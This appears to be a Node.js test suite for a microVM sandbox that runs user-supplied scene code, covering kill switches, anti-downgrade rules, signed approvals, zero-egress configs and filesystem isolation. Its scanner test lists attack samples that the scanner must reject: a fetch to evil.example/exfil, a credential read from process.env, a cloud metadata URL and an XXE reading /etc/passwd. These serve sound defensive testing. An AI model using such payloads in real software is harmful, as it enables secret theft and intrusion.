// @ts-check
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";

import {
  APPROVED_PREINSTALLED_SCENE_IMPORTS,
  CUSTOM_RUNTIME_ADR_0002,
  CUSTOM_RUNTIME_ADR_ID,
  CustomRuntimeError,
  DEFAULT_BUILD_VM_BOUNDS,
  DEFAULT_PINNED_KERNEL_DIGEST,
  DEFAULT_PINNED_ROOTFS_DIGEST,
  DEFAULT_RENDER_VM_BOUNDS,
  DisposableMicroVmRuntime,
  FORBIDDEN_DOWNGRADE_RUNTIMES,
  MicroVmWorkspacePrison,
  REQUIRED_C1_TO_C6_GATES,
  assertZeroEgressMicroVmSpec,
  buildCustomSceneCspHeader,
  buildFirecrackerMachineConfig,
  buildMicroVmCgroupV2Spec,
  buildMicroVmGuestEnv,
  evaluateCustomRuntimePolicy,
  probeHostVirtualization,
  runCustomRuntimeSelfTest,
  sanitizeAndBoundMicroVmLog,
  scanCustomSourceForForbiddenCapabilities,
  signC1ToC6GateAttestation,
  signGvisorExplicitReviewApproval,
  validateBuildVmBounds,
  validateMicroVmHostPaths,
  validateRenderVmBounds,
  verifyC1ToC6Gates,
  verifyGvisorExplicitReviewApproval,
} from "../index.mjs";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const WORKTREE_ROOT = path.resolve(__dirname, "../../..");

const TEST_SIGNING_SECRET =
  "p701_security_reviewer_hmac_secret_key_32_bytes_minimum_length!";

const VALID_SCENE_SOURCE = `
import { clamp } from "@creativanta/scene-math";

export function renderFrame(frame) {
  return { frame: clamp(frame, 0, 90), title: "Creativanta P7-01" };
}
`;

describe("P7-01: Custom Runtime ADR 0002 & Anti-Downgrade Policy", () => {
  it("documents ADR 0002 in both packages/custom-runtime and evidence/P7-01 with required sections", () => {
    const pkgAdrPath = path.join(
      WORKTREE_ROOT,
      "packages/custom-runtime/ADR-0002-custom-scene-microvm-runtime.md"
    );
    const evidenceAdrPath = path.join(
      WORKTREE_ROOT,
      "evidence/P7-01/ADR-0002-custom-scene-microvm-runtime.md"
    );
    assert.equal(fs.existsSync(pkgAdrPath), true);
    assert.equal(fs.existsSync(evidenceAdrPath), true);

    const pkgAdr = fs.readFileSync(pkgAdrPath, "utf8");
    const evidenceAdr = fs.readFileSync(evidenceAdrPath, "utf8");
    assert.equal(pkgAdr, evidenceAdr, "ADR copies must be byte-identical");
    assert.match(pkgAdr, /# ADR 0002/);
    assert.match(pkgAdr, /custom-build-vm/);
    assert.match(pkgAdr, /custom-render-vm/);
    assert.match(pkgAdr, /gvisor-runsc-v1/);
    assert.match(pkgAdr, /Anti-Downgrade Policy/);
    assert.match(pkgAdr, /C1.*C6/s);

    assert.equal(CUSTOM_RUNTIME_ADR_0002.adrId, "ADR-0002");
    assert.equal(CUSTOM_RUNTIME_ADR_0002.taskId, "P7-01");
    assert.equal(CUSTOM_RUNTIME_ADR_0002.defaultState.CVE_CUSTOM_CODE_ENABLED, false);
    assert.equal(CUSTOM_RUNTIME_ADR_0002.defaultState.CVE_CUSTOM_RUNTIME, "disabled");
  });

  it("keeps custom runtime disabled by default and respects kill switch and tenant allowlist", () => {
    // 1. Default config (CVE_CUSTOM_CODE_ENABLED=false, CVE_CUSTOM_RUNTIME=disabled)
    assert.throws(
      () =>
        evaluateCustomRuntimePolicy({
          config: {
            CVE_CUSTOM_CODE_ENABLED: false,
            CVE_CUSTOM_RUNTIME: "disabled",
            CVE_CUSTOM_TENANT_ALLOWLIST: [],
          },
          tenantId: "tenant_alpha",
        }),
      (err) => err instanceof CustomRuntimeError && err.code === "CAPABILITY_DISABLED"
    );

    // 2. Kill switch enabled -> CAPABILITY_DISABLED
    assert.throws(
      () =>
        evaluateCustomRuntimePolicy({
          config: {
            CVE_CUSTOM_CODE_ENABLED: true,
            CVE_CUSTOM_RUNTIME: "microvm-firecracker-v1",
            CVE_CUSTOM_TENANT_ALLOWLIST: ["tenant_alpha"],
          },
          tenantId: "tenant_alpha",
          killSwitchActive: true,
        }),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.code === "CAPABILITY_DISABLED" &&
        err.details?.reason === "KILL_SWITCH_ACTIVE"
    );

    // 3. Tenant not in allowlist -> TENANT_NOT_ALLOWLISTED
    const futureIso = new Date(Date.now() + 7 * 86400 * 1000).toISOString();
    const validGateAttestation = signC1ToC6GateAttestation(
      {
        runtime: "microvm-firecracker-v1",
        rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
        guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
        reviewer: "security-reviewer@creativanta.internal",
        reviewedAt: "2026-11-04T00:00:00Z",
        expiresAt: futureIso,
        killSwitchVerified: true,
        gates: Object.fromEntries(REQUIRED_C1_TO_C6_GATES.map((g) => [g, true])),
      },
      TEST_SIGNING_SECRET
    );
    assert.throws(
      () =>
        evaluateCustomRuntimePolicy({
          config: {
            CVE_CUSTOM_CODE_ENABLED: true,
            CVE_CUSTOM_RUNTIME: "microvm-firecracker-v1",
            CVE_CUSTOM_TENANT_ALLOWLIST: ["tenant_alpha", "tenant_beta"],
          },
          tenantId: "tenant_unauthorized",
          rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
          guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
          c1ToC6Attestation: validGateAttestation,
          signingSecret: TEST_SIGNING_SECRET,
          hostProbe: probeHostVirtualization({
            overrideKvmAvailable: true,
            overrideBinaries: { firecracker: true, jailer: true },
          }),
        }),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.code === "CAPABILITY_DISABLED" &&
        err.details?.reason === "TENANT_NOT_ALLOWLISTED"
    );
  });

  it("enforces anti-downgrade hard lock against standard containers, host execution, or simulated prison in production", () => {
    for (const badRuntime of FORBIDDEN_DOWNGRADE_RUNTIMES) {
      assert.throws(
        () =>
          evaluateCustomRuntimePolicy({
            config: {
              CVE_CUSTOM_CODE_ENABLED: true,
              CVE_CUSTOM_RUNTIME: badRuntime,
              CVE_CUSTOM_TENANT_ALLOWLIST: ["tenant_alpha"],
            },
            tenantId: "tenant_alpha",
          }),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.code === "SANDBOX_SECURITY_VIOLATION" &&
          err.details?.reason === "RUNTIME_DOWNGRADE_FORBIDDEN",
        `Expected ${badRuntime} to be rejected with RUNTIME_DOWNGRADE_FORBIDDEN`
      );
    }
  });

  it("keeps production custom code disabled when host lacks KVM/Firecracker/Kata instead of downgrading", () => {
    const noKvmProbe = probeHostVirtualization({
      overrideKvmAvailable: false,
      overrideBinaries: {
        firecracker: false,
        jailer: false,
        "kata-runtime": false,
        runsc: false,
      },
    });
    assert.equal(noKvmProbe.kvmReadableWritable, false);
    assert.equal(noKvmProbe.firecrackerReady, false);
    assert.equal(noKvmProbe.kataReady, false);
    assert.equal(noKvmProbe.microVmHardwareReady, false);

    assert.throws(
      () =>
        evaluateCustomRuntimePolicy({
          config: {
            CVE_CUSTOM_CODE_ENABLED: true,
            CVE_CUSTOM_RUNTIME: "microvm-firecracker-v1",
            CVE_CUSTOM_TENANT_ALLOWLIST: ["tenant_alpha"],
          },
          tenantId: "tenant_alpha",
          hostProbe: noKvmProbe,
        }),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.code === "CAPABILITY_DISABLED" &&
        err.details?.reason === "VIRTUALIZATION_UNAVAILABLE"
    );
  });

  it("blocks gvisor-runsc-v1 without explicit signed C+Security review and validates all review fields", () => {
    const futureIso = new Date(Date.now() + 7 * 86400 * 1000).toISOString();

    // 1. Missing gVisor approval -> GVISOR_EXPLICIT_REVIEW_REQUIRED
    assert.throws(
      () =>
        evaluateCustomRuntimePolicy({
          config: {
            CVE_CUSTOM_CODE_ENABLED: true,
            CVE_CUSTOM_RUNTIME: "gvisor-runsc-v1",
            CVE_CUSTOM_TENANT_ALLOWLIST: ["tenant_alpha"],
          },
          tenantId: "tenant_alpha",
          rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
          guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
          signingSecret: TEST_SIGNING_SECRET,
        }),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.code === "SANDBOX_SECURITY_VIOLATION" &&
        err.details?.reason === "GVISOR_EXPLICIT_REVIEW_REQUIRED"
    );

    // 2. Valid signed gVisor review approval + C1-C6 attestation + runsc binary present -> allowed
    const signedApproval = signGvisorExplicitReviewApproval(
      {
        adrId: CUSTOM_RUNTIME_ADR_ID,
        adrAmendmentId: "ADR-0002-AMEND-GVISOR-01",
        reviewedRuntimeDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
        reviewer: "security-reviewer@creativanta.internal",
        reviewedAt: "2026-11-04T00:00:00Z",
        expiresAt: futureIso,
        escapeSuitePassed: true,
        compatibilitySuitePassed: true,
        resourceBoundsSuitePassed: true,
        noDowngradeVerified: true,
      },
      TEST_SIGNING_SECRET
    );

    const verified = verifyGvisorExplicitReviewApproval(
      signedApproval,
      DEFAULT_PINNED_ROOTFS_DIGEST,
      TEST_SIGNING_SECRET
    );
    assert.equal(verified, true);

    const validGateAttestation = signC1ToC6GateAttestation(
      {
        runtime: "gvisor-runsc-v1",
        rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
        guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
        reviewer: "security-reviewer@creativanta.internal",
        reviewedAt: "2026-11-04T00:00:00Z",
        expiresAt: futureIso,
        killSwitchVerified: true,
        gates: Object.fromEntries(REQUIRED_C1_TO_C6_GATES.map((g) => [g, true])),
      },
      TEST_SIGNING_SECRET
    );

    const policyRes = evaluateCustomRuntimePolicy({
      config: {
        CVE_CUSTOM_CODE_ENABLED: true,
        CVE_CUSTOM_RUNTIME: "gvisor-runsc-v1",
        CVE_CUSTOM_TENANT_ALLOWLIST: ["tenant_alpha"],
      },
      tenantId: "tenant_alpha",
      rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
      guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
      gvisorApproval: signedApproval,
      c1ToC6Attestation: validGateAttestation,
      signingSecret: TEST_SIGNING_SECRET,
      hostProbe: probeHostVirtualization({
        overrideBinaries: { runsc: true },
      }),
    });
    assert.equal(policyRes.allowed, true);
    assert.equal(policyRes.runtime, "gvisor-runsc-v1");

    // 3. Expired gVisor review rejected
    assert.throws(
      () =>
        verifyGvisorExplicitReviewApproval(
          signedApproval,
          DEFAULT_PINNED_ROOTFS_DIGEST,
          TEST_SIGNING_SECRET,
          new Date("2028-01-01T00:00:00Z")
        ),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.details?.reason === "GVISOR_REVIEW_EXPIRED"
    );

    // 4. Tampered field rejected with GVISOR_SIGNATURE_INVALID
    assert.throws(
      () =>
        verifyGvisorExplicitReviewApproval(
          {
            ...signedApproval,
            reviewer: "untrusted@evil.example",
          },
          DEFAULT_PINNED_ROOTFS_DIGEST,
          TEST_SIGNING_SECRET
        ),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.details?.reason === "GVISOR_SIGNATURE_INVALID"
    );

    // 5. Digest mismatch rejected with GVISOR_DIGEST_MISMATCH
    assert.throws(
      () =>
        verifyGvisorExplicitReviewApproval(
          signedApproval,
          "sha256:" + "b".repeat(64),
          TEST_SIGNING_SECRET
        ),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.details?.reason === "GVISOR_DIGEST_MISMATCH"
    );
  });

  it("verifies C1-C6 gate attestation and blocks missing gates or rootfs/kernel digest drift", () => {
    const futureIso = new Date(Date.now() + 7 * 86400 * 1000).toISOString();
    const signedGates = signC1ToC6GateAttestation(
      {
        runtime: "microvm-firecracker-v1",
        rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
        guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
        reviewer: "security-reviewer@creativanta.internal",
        reviewedAt: "2026-11-04T00:00:00Z",
        expiresAt: futureIso,
        killSwitchVerified: true,
        gates: Object.fromEntries(REQUIRED_C1_TO_C6_GATES.map((g) => [g, true])),
      },
      TEST_SIGNING_SECRET
    );

    const res = verifyC1ToC6Gates(
      signedGates,
      DEFAULT_PINNED_ROOTFS_DIGEST,
      DEFAULT_PINNED_KERNEL_DIGEST,
      TEST_SIGNING_SECRET
    );
    assert.equal(res, true);

    // Drift in rootfs digest must fail C6
    assert.throws(
      () =>
        verifyC1ToC6Gates(
          signedGates,
          "sha256:" + "9".repeat(64),
          DEFAULT_PINNED_KERNEL_DIGEST,
          TEST_SIGNING_SECRET
        ),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.details?.reason === "ROOTFS_DIGEST_DRIFT"
    );
  });
});

describe("P7-01: Resource Bounds, Firecracker Config & Isolation Guards", () => {
  it("enforces build-vm and render-vm resource bounds and builds cgroup v2 + Firecracker configs", () => {
    const validBuild = validateBuildVmBounds(DEFAULT_BUILD_VM_BOUNDS);
    assert.equal(validBuild.vcpuCount, 1);
    assert.equal(validBuild.memoryMib, 1024);

    const validRender = validateRenderVmBounds(DEFAULT_RENDER_VM_BOUNDS);
    assert.equal(validRender.vcpuCount, 2);
    assert.equal(validRender.memoryMib, 4096);

    // Reject excessive vCPU, memory, or timeout
    assert.throws(
      () => validateBuildVmBounds({ vcpuCount: 4 }),
      (err) => err instanceof CustomRuntimeError && err.code === "SANDBOX_RESOURCE_LIMIT"
    );
    assert.throws(
      () => validateRenderVmBounds({ memoryMib: 16384 }),
      (err) => err instanceof CustomRuntimeError && err.code === "SANDBOX_RESOURCE_LIMIT"
    );
    assert.throws(
      () => validateBuildVmBounds({ timeoutMs: 300_000 }),
      (err) => err instanceof CustomRuntimeError && err.code === "SANDBOX_RESOURCE_LIMIT"
    );

    const cgroup = buildMicroVmCgroupV2Spec(validRender);
    assert.equal(cgroup.memorySwapMax, "0");
    assert.equal(cgroup.pidsMax, "256");
    assert.equal(cgroup.cpuMax, "200000 100000");

    const fcConfig = buildFirecrackerMachineConfig({
      vmId: "vm_fc_test_01",
      phase: "render",
      bounds: validRender,
      kernelImagePath: "/var/lib/cve/images/vmlinux.bin",
      guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
      rootfsImagePath: "/var/lib/cve/images/rootfs.ext4",
      rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
      inputsDrivePath: "/tmp/prison/inputs",
      scratchOutputDrivePath: "/tmp/prison/output",
    });
    assert.equal(fcConfig.machineConfig["machine-config"].smt, false);
    assert.deepEqual(fcConfig.machineConfig["network-interfaces"], []);
    assert.equal(fcConfig.machineConfig.mmds_config, null);
    assert.equal(fcConfig.machineConfig.drives[0].is_read_only, true);
    assert.equal(fcConfig.machineConfig.drives[1].is_read_only, true);
    assert.equal(fcConfig.machineConfig.drives[2].is_read_only, false);
    assert.equal(assertZeroEgressMicroVmSpec(fcConfig), true);
  });

  it("blocks forbidden APIs, dynamic import(), external URLs, metadata IPs, XXE, and unapproved imports", () => {
    const cleanReport = scanCustomSourceForForbiddenCapabilities([
      {
        relativePath: "scene.js",
        content: VALID_SCENE_SOURCE,
      },
    ]);
    assert.equal(cleanReport.passed, true);
    assert.equal(cleanReport.scannedFilesCount, 1);

    const attackVectors = [
      { name: "fetch()", code: `export const x = () => fetch("https://evil.example/exfil");` },
      { name: "XMLHttpRequest", code: `export const x = new XMLHttpRequest();` },
      { name: "WebSocket", code: `export const x = new WebSocket("wss://evil.example");` },
      { name: "RTCPeerConnection", code: `export const x = new RTCPeerConnection();` },
      { name: "eval()", code: `export const x = eval("1+1");` },
      { name: "new Function()", code: `export const x = new Function("return 1");` },
      { name: "process.env", code: `export const x = process.env.AWS_SECRET_ACCESS_KEY;` },
      { name: "child_process", code: `import cp from "node:child_process";` },
      { name: "dynamic import()", code: `export const x = () => import("fs");` },
      { name: "cloud metadata IP", code: `export const url = "169.254.169.254/latest/meta-data";` },
      { name: "SVG XXE ENTITY", code: `export const svg = "<!DOCTYPE svg [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>";` },
      { name: "unapproved npm package", code: `import axios from "axios";` },
    ];

    for (const vector of attackVectors) {
      assert.throws(
        () =>
          scanCustomSourceForForbiddenCapabilities([
            {
              relativePath: "scene.js",
              content: vector.code,
            },
          ]),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.code === "SANDBOX_SECURITY_VIOLATION",
        `Expected attack vector '${vector.name}' to be blocked`
      );
    }

    assert.equal(
      APPROVED_PREINSTALLED_SCENE_IMPORTS.includes("@creativanta/scene-runtime"),
      true
    );
  });

  it("enforces zero-egress spec, strict CSP header, zero-secrets guest env, and log redaction", () => {
    const csp = buildCustomSceneCspHeader("export const frame = 1;");
    assert.match(csp.cspHeader, /default-src 'none'/);
    assert.match(csp.cspHeader, /connect-src 'none'/);
    assert.match(csp.cspHeader, /frame-src 'none'/);
    assert.match(csp.cspHeader, /worker-src 'none'/);

    assert.throws(
      () =>
        assertZeroEgressMicroVmSpec({
          "network-interfaces": [{ iface_id: "eth0", host_dev_name: "tap0" }],
          mmds_config: null,
        }),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.details?.reason === "EGRESS_NIC_FORBIDDEN"
    );

    const env = buildMicroVmGuestEnv({
      vmId: "vm_render_01",
      phase: "render",
      jobId: "job_01",
      attemptId: "att_01",
      leaseEpoch: 1,
      loopbackAssetOrigin: "http://127.0.0.1:41234",
    });
    assert.equal(env.TZ, "UTC");
    assert.equal(env.CVE_LOOPBACK_ASSET_ORIGIN, "http://127.0.0.1:41234");
    assert.equal("AWS_SECRET_ACCESS_KEY" in env, false);

    assert.throws(
      () =>
        buildMicroVmGuestEnv({
          vmId: "vm_render_01",
          phase: "render",
          jobId: "job_01",
          attemptId: "att_01",
          extraEnv: {
            DATABASE_URL: "postgres://user:pass@db/prod",
          },
        }),
      (err) =>
        err instanceof CustomRuntimeError &&
        err.details?.reason === "SECRET_ENV_FORBIDDEN"
    );

    const canary = "CANARY_SECRET_9988776655";
    const rawLog =
      `Line1 token=${canary} key=cve_live_0123456789ab_ffffffffffffffffffffffffffffffff https://s3.example/file?X-Amz-Signature=deadbeef\n` +
      "A".repeat(80_000);
    const sanitized = sanitizeAndBoundMicroVmLog(rawLog, [canary]);
    assert.equal(sanitized.truncated, true);
    assert.equal(sanitized.text.includes(canary), false);
    assert.equal(sanitized.text.includes("ffffffffffffffff"), false);
    assert.equal(sanitized.text.includes("deadbeef"), false);
  });

  it("enforces zero-host-FS mounts and read-only staged inputs with symlink/hardlink rejection", () => {
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "p7-01-fs-test-"));
    try {
      const prisonMgr = new MicroVmWorkspacePrison(tmpRoot);
      const prison = prisonMgr.createPrison(
        "vm_fs_test_01",
        "build",
        "job_fs_01",
        "att_fs_01"
      );

      // Host path validator rejects /var/run/docker.sock and /etc/shadow
      assert.throws(
        () => validateMicroVmHostPaths(["/var/run/docker.sock"], prison.rootDir),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.details?.reason === "HOST_FS_MOUNT_FORBIDDEN"
      );

      // Reject path traversal
      assert.throws(
        () =>
          prisonMgr.stageReadOnlyInputs(prison, [
            { relativePath: "../escape.txt", content: "boom" },
          ]),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.details?.reason === "PATH_TRAVERSAL_BLOCKED"
      );

      // Stage valid read-only file and verify child process gets EACCES on write
      const stagedMap = prisonMgr.stageReadOnlyInputs(prison, [
        { relativePath: "bundle/scene.js", content: "export default {};\n" },
      ]);
      const stagedFile = stagedMap.get("bundle/scene.js").filePath;
      const writeAttempt = spawnSync(
        process.execPath,
        [
          "-e",
          `const fs = require("node:fs"); try { fs.writeFileSync(${JSON.stringify(stagedFile)}, "hacked"); process.exit(0); } catch (e) { console.error(e.code); process.exit(42); }`,
        ],
        { encoding: "utf8" }
      );
      assert.equal(writeAttempt.status, 42);
      assert.match(writeAttempt.stderr, /EACCES|EPERM/);

      // Reject symlink inside outputDir
      const symlinkPath = path.join(prison.outputDir, "passwd-link");
      fs.symlinkSync("/etc/passwd", symlinkPath);
      assert.throws(
        () => prisonMgr.enforceScratchAndOutputQuota(prison, 10 * 1024 * 1024),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.details?.reason === "SYMLINK_FORBIDDEN"
      );
      fs.unlinkSync(symlinkPath);

      // Reject hardlink (nlink > 1) inside outputDir
      const externalFile = path.join(tmpRoot, "external-target.txt");
      fs.writeFileSync(externalFile, "secret");
      const hardlinkPath = path.join(prison.outputDir, "hardlink.txt");
      fs.linkSync(externalFile, hardlinkPath);
      assert.throws(
        () => prisonMgr.enforceScratchAndOutputQuota(prison, 10 * 1024 * 1024),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.details?.reason === "HARDLINK_FORBIDDEN"
      );

      prisonMgr.destroyPrison(prison);
      assert.equal(fs.existsSync(prison.rootDir), false);
    } finally {
      fs.rmSync(tmpRoot, { recursive: true, force: true });
    }
  });
});

describe("P7-01: Two-Phase Disposable Build & Render microVM Lifecycle", () => {
  it("executes isolated build in custom-build-vm and isolated render in separate custom-render-vm, destroying both", async () => {
    const runtime = new DisposableMicroVmRuntime();
    try {
      const buildRes = await runtime.runIsolatedBuild({
        bundleId: "bnd_p7_01_test",
        revision: 1,
        entrypoint: "scene.js",
        sourceFiles: [{ relativePath: "scene.js", content: VALID_SCENE_SOURCE }],
        securitySelfTestMode: true,
      });

      const buildAtt = buildRes.buildMicroVmInstance.getAttestation();
      assert.equal(buildAtt.destroyed, true);
      assert.equal(buildAtt.prisonWiped, true);
      assert.match(buildAtt.vmId, /^vm_build_/);
      assert.equal(buildRes.sourceSha256.length, 64);
      assert.equal(buildRes.buildSha256.length, 64);
      assert.match(buildRes.cspHeader, /connect-src 'none'/);

      const renderRes = await runtime.runIsolatedRender({
        compiledBundle: buildRes,
        stagedAssets: [
          {
            relativePath: "logo.svg",
            urlPath: "/assets/logo.svg",
            content: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"></svg>',
            mimeType: "image/svg+xml",
          },
        ],
        expectedFormat: "mp4",
        securitySelfTestMode: true,
      });

      const renderAtt = renderRes.renderMicroVmInstance.getAttestation();
      assert.equal(renderAtt.destroyed, true);
      assert.equal(renderAtt.prisonWiped, true);
      assert.match(renderAtt.vmId, /^vm_render_/);
      assert.notEqual(renderAtt.vmId, buildAtt.vmId);
      assert.equal(renderRes.artifactSha256.length, 64);
      assert.equal(renderRes.artifactBytes.subarray(4, 8).toString("ascii"), "ftyp");
    } finally {
      runtime.cleanupBaseDir();
    }
  });

  it("forbids reusing a disposable microVM instance across jobs or booting twice", async () => {
    const runtime = new DisposableMicroVmRuntime();
    try {
      const vm = runtime.allocateDisposableMicroVm({
        phase: "build",
        jobId: "job_reuse_test",
        attemptId: "att_reuse_01",
        securitySelfTestMode: true,
      });
      vm.boot();

      await vm.executeOnce({
        command: process.execPath,
        argv: ["-e", "process.exit(0);"],
      });

      // Second execution on same VM must throw MICROVM_REUSE_FORBIDDEN
      await assert.rejects(
        () =>
          vm.executeOnce({
            command: process.execPath,
            argv: ["-e", "process.exit(0);"],
          }),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.details?.reason === "MICROVM_REUSE_FORBIDDEN"
      );

      // Second boot on same VM must also throw MICROVM_REUSE_FORBIDDEN
      assert.throws(
        () => vm.boot(),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.details?.reason === "MICROVM_REUSE_FORBIDDEN"
      );

      vm.destroy();
      assert.equal(vm.getAttestation().destroyed, true);
    } finally {
      runtime.cleanupBaseDir();
    }
  });

  it("terminates runaway guest processes on timeout with SIGKILL and destroys the microVM", async () => {
    const runtime = new DisposableMicroVmRuntime();
    try {
      const vm = runtime.allocateDisposableMicroVm({
        phase: "build",
        jobId: "job_timeout_test",
        attemptId: "att_timeout_01",
        bounds: { timeoutMs: 120 },
        securitySelfTestMode: true,
      });
      vm.boot();

      await assert.rejects(
        () =>
          vm.executeOnce({
            command: process.execPath,
            argv: ["-e", "while (true) {}"],
            timeoutMs: 120,
            timeoutCode: "RENDER_TIMEOUT",
          }),
        (err) => err instanceof CustomRuntimeError && err.code === "RENDER_TIMEOUT"
      );

      vm.destroy();
      assert.equal(vm.getAttestation().destroyed, true);
      assert.equal(vm.getAttestation().prisonWiped, true);
    } finally {
      runtime.cleanupBaseDir();
    }
  });

  it("rejects stale lease_epoch before committing build or render outputs", async () => {
    const runtime = new DisposableMicroVmRuntime();
    try {
      await assert.rejects(
        () =>
          runtime.runIsolatedBuild({
            bundleId: "bnd_stale_epoch",
            revision: 1,
            entrypoint: "scene.js",
            sourceFiles: [{ relativePath: "scene.js", content: VALID_SCENE_SOURCE }],
            isLeaseValid: () => false,
            securitySelfTestMode: true,
          }),
        (err) =>
          err instanceof CustomRuntimeError &&
          err.details?.reason === "LEASE_FENCE_REJECTED"
      );
    } finally {
      runtime.cleanupBaseDir();
    }
  });

  it("runs the full 12-check runCustomRuntimeSelfTest suite with 12/12 passing", async () => {
    const report = await runCustomRuntimeSelfTest();
    assert.equal(report.taskId, "P7-01");
    assert.equal(report.adrId, "ADR-0002");
    assert.equal(report.status, "PASS");
    assert.equal(report.totalChecks, 12);
    assert.equal(report.passedChecks, 12);
    assert.equal(report.failedChecks, 0);
  });
});
